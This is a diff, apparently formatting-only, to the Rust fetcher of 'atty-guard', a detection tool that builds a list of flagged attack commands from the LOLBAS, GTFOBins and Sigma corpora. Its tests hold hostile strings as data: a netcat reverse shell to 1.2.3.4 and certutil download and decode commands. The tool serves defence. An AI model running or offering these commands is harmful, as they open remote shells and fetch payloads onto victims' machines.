@@ -111,7 +111,10 @@ impl Default for FetcherConfig {
         Self {
             output_path: default_atoms_path(),
             timeout: Duration::from_secs(30),
-            user_agent: format!("atty-guard/{} (+https://github.com/fentas/atty)", env!("CARGO_PKG_VERSION")),
+            user_agent: format!(
+                "atty-guard/{} (+https://github.com/fentas/atty)",
+                env!("CARGO_PKG_VERSION")
+            ),
         }
     }
 }
@@ -271,7 +274,8 @@ mod imp {
         // but the parser shape matches the others. Each binary
         // YAML carries a `Commands` list of `{Command, Description,
         // Usecase, ...}` entries; we take the `Command` strings.
-        const URL: &str = "https://codeload.github.com/LOLBAS-Project/LOLBAS/tar.gz/refs/heads/master";
+        const URL: &str =
+            "https://codeload.github.com/LOLBAS-Project/LOLBAS/tar.gz/refs/heads/master";
         let buf = download_tarball(cfg, URL)?;
         walk_tarball_atoms(&buf, is_lolbas_binary_yml, extract_lolbas_atoms)
     }
@@ -343,7 +347,9 @@ mod imp {
         if !etype.is_file() {
             return false;
         }
-        let Some(parent) = path.parent() else { return false };
+        let Some(parent) = path.parent() else {
+            return false;
+        };
         // Need: parent ends with `_gtfobins`. Reject the rare entry
         // that nests further (e.g. `_gtfobins/subdir/foo`).
         parent
@@ -403,7 +409,9 @@ mod imp {
         // markdown body would be handed to serde_yaml. Bail clean
         // on missing fence: the upstream file is malformed and we
         // shouldn't pretend to parse atoms from prose.
-        let stripped = content.strip_prefix("---\n").or_else(|| content.strip_prefix("---\r\n"));
+        let stripped = content
+            .strip_prefix("---\n")
+            .or_else(|| content.strip_prefix("---\r\n"));
         let Some(rest) = stripped else { return };
         let close_marker = if let Some(at) = rest.find("\n---\n") {
             (at, 5)
@@ -579,11 +587,7 @@ mod imp {
     /// gets a fresh corpus on startup, not after one interval), then
     /// sleeps. Failures don't abort the thread — the next interval
     /// gets another shot.
-    pub fn spawn_periodic_refresh(
-        cfg: FetcherConfig,
-        sources: Vec<SourceId>,
-        interval: Duration,
-    ) {
+    pub fn spawn_periodic_refresh(cfg: FetcherConfig, sources: Vec<SourceId>, interval: Duration) {
         let builder = std::thread::Builder::new().name("atty-guard-atoms-refresh".into());
         let spawn_result = builder.spawn(move || loop {
             match fetch_all(&cfg, &sources) {
@@ -601,7 +605,9 @@ mod imp {
             std::thread::sleep(interval);
         });
         if let Err(e) = spawn_result {
-            eprintln!("atty-guard: cron thread spawn failed — {e}; atoms will not refresh until restart");
+            eprintln!(
+                "atty-guard: cron thread spawn failed — {e}; atoms will not refresh until restart"
+            );
         }
     }
 
@@ -641,7 +647,10 @@ mod imp {
             // Sanity: the example is between min and max.
             assert!(perl_one_liner.len() > 60);
             assert!(perl_one_liner.len() <= ATOM_MAX_LEN);
-            assert_eq!(atom_from_code(perl_one_liner).as_deref(), Some(perl_one_liner));
+            assert_eq!(
+                atom_from_code(perl_one_liner).as_deref(),
+                Some(perl_one_liner)
+            );
         }
 
         #[test]
@@ -722,7 +731,9 @@ Commands:
 "#;
             let mut atoms = BTreeSet::new();
             extract_lolbas_atoms(doc, &mut atoms);
-            assert!(atoms.iter().any(|a| a.starts_with("certutil.exe -urlcache")));
+            assert!(atoms
+                .iter()
+                .any(|a| a.starts_with("certutil.exe -urlcache")));
             assert!(atoms.iter().any(|a| a.starts_with("certutil -decode")));
         }
 
@@ -740,22 +751,52 @@ Commands:
             use std::path::Path;
             let f = tar::EntryType::Regular;
             let d = tar::EntryType::Directory;
-            assert!(is_sigma_linux_rule(Path::new("sigma-master/rules/linux/lateral_movement/foo.yml"), f));
-            assert!(!is_sigma_linux_rule(Path::new("sigma-master/rules/linux/x"), d)); // not a file
-            assert!(!is_sigma_linux_rule(Path::new("sigma-master/rules/windows/persist.yml"), f)); // wrong OS
-            assert!(!is_sigma_linux_rule(Path::new("sigma-master/rules/linux/readme.md"), f)); // wrong ext
+            assert!(is_sigma_linux_rule(
+                Path::new("sigma-master/rules/linux/lateral_movement/foo.yml"),
+                f
+            ));
+            assert!(!is_sigma_linux_rule(
+                Path::new("sigma-master/rules/linux/x"),
+                d
+            )); // not a file
+            assert!(!is_sigma_linux_rule(
+                Path::new("sigma-master/rules/windows/persist.yml"),
+                f
+            )); // wrong OS
+            assert!(!is_sigma_linux_rule(
+                Path::new("sigma-master/rules/linux/readme.md"),
+                f
+            )); // wrong ext
         }
 
         #[test]
         fn is_lolbas_binary_yml_covers_all_four_subdirs() {
             use std::path::Path;
             let f = tar::EntryType::Regular;
-            assert!(is_lolbas_binary_yml(Path::new("LOLBAS-master/yml/OSBinaries/certutil.yml"), f));
-            assert!(is_lolbas_binary_yml(Path::new("LOLBAS-master/yml/OSScripts/cscript.yml"), f));
-            assert!(is_lolbas_binary_yml(Path::new("LOLBAS-master/yml/OSLibraries/comsvcs.yml"), f));
-            assert!(is_lolbas_binary_yml(Path::new("LOLBAS-master/yml/OtherMSBinaries/devtoolslauncher.yml"), f));
-            assert!(!is_lolbas_binary_yml(Path::new("LOLBAS-master/README.md"), f));
-            assert!(!is_lolbas_binary_yml(Path::new("LOLBAS-master/yml/index.json"), f));
+            assert!(is_lolbas_binary_yml(
+                Path::new("LOLBAS-master/yml/OSBinaries/certutil.yml"),
+                f
+            ));
+            assert!(is_lolbas_binary_yml(
+                Path::new("LOLBAS-master/yml/OSScripts/cscript.yml"),
+                f
+            ));
+            assert!(is_lolbas_binary_yml(
+                Path::new("LOLBAS-master/yml/OSLibraries/comsvcs.yml"),
+                f
+            ));
+            assert!(is_lolbas_binary_yml(
+                Path::new("LOLBAS-master/yml/OtherMSBinaries/devtoolslauncher.yml"),
+                f
+            ));
+            assert!(!is_lolbas_binary_yml(
+                Path::new("LOLBAS-master/README.md"),
+                f
+            ));
+            assert!(!is_lolbas_binary_yml(
+                Path::new("LOLBAS-master/yml/index.json"),
+                f
+            ));
         }
 
         #[test]
@@ -782,7 +823,10 @@ Commands:
             let doc = "---\nfunctions:\n  shell:\n    - code: |\n        nc -e /bin/sh 1.2.3.4\nNo closing fence here, just markdown text after the front-matter.\n";
             let mut atoms = BTreeSet::new();
             extract_gtfobins_atoms(doc, &mut atoms);
-            assert!(atoms.is_empty(), "expected no atoms from malformed file, got {atoms:?}");
+            assert!(
+                atoms.is_empty(),
+                "expected no atoms from malformed file, got {atoms:?}"
+            );
         }
 
         #[test]
@@ -791,7 +835,8 @@ Commands:
             // fetch_all returns an error and DOES NOT call
             // write_atoms. Belt-and-braces against silently
             // wiping the last-good corpus.
-            let dir = std::env::temp_dir().join(format!("atty-guard-fetcher-empty-{}", std::process::id()));
+            let dir = std::env::temp_dir()
+                .join(format!("atty-guard-fetcher-empty-{}", std::process::id()));
             let path = dir.join("flagged_atoms.txt");
             let cfg = FetcherConfig {
                 output_path: path.clone(),
@@ -799,12 +844,16 @@ Commands:
             };
             let result = fetch_all(&cfg, &[]);
             assert!(matches!(result, Err(FetchError::ParseError(_))));
-            assert!(!path.exists(), "fetch_all must not create the output file on empty success set");
+            assert!(
+                !path.exists(),
+                "fetch_all must not create the output file on empty success set"
+            );
         }
 
         #[test]
         fn write_atoms_roundtrips_via_tmp_rename() {
-            let dir = std::env::temp_dir().join(format!("atty-guard-fetcher-{}", std::process::id()));
+            let dir =
+                std::env::temp_dir().join(format!("atty-guard-fetcher-{}", std::process::id()));
             let path = dir.join("flagged_atoms.txt");
             let mut s = BTreeSet::new();
             s.insert("nc -e /bin/sh".to_owned());
